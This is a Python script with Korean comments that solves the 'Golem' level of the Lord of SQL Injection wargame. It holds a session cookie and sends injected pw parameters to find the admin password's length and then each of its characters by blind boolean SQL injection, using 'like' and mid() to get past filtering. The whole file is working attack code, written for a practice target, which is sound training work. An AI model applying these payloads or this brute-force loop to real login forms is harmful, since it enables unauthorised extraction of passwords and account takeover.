# -*- coding : UTF-8 -*-
from requests import get
import string

print("#### Lord of SQL Injection - Golem ####\n")

# URL을 설정합니다.
url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"

#쿠키를 세팅합니다. 반드시 당신의 쿠키로 설정해야 합니다.
cookies = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")
abc = string.digits + string.ascii_letters                  #ASCII의 문자를 저장합니다. (브루트포스할 때 필요)
result = ""

#pw의 길이를 게싱합니다.
for i in range(1,20):
    param = "?pw='||id like 'admin' %26%26 length(pw) <> " + str(i) + "%23"
    new_url = url + param
    r = get(new_url, cookies=cookies)

    if r.text.find("<h2>Hello admin</h2>") == -1:
        idLength = i + 1
        print("pw의 길이는 " + str(i) + " 입니다.")
        break


#얻은 정보를 바탕으로 블라인드 SQL Injection을 진행합니다.
print("\n\n#### Starting Blind SQL Injection ####\n")
for i in range(1, idLength):
    for a in abc:
        param = "?pw=1'|| id like 'admin' %26%26 mid(pw," + str(i) + ",1) like '"+a+"'%23"
        new_url = url + param
        r = get(new_url, cookies=cookies)

        if r.text.find("<h2>Hello admin</h2>") > 0:
            print(str(i) + "번 째 pw의 값은 '" + a + "' 입니다. ")
            result += a
            break

    if i == 1 and result == "":
        print("FAIL")
        exit(0)

    if i == idLength-1:
        print("\n\n#### RESULT ####")
        print("pw : " + result)

url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=" + result
r = get(url, cookies=cookies)

if r.text.find("<h2>GOLEM Clear!</h2>") > 0:
    print("축하합니다! Golem를 클리어했습니다.")
    
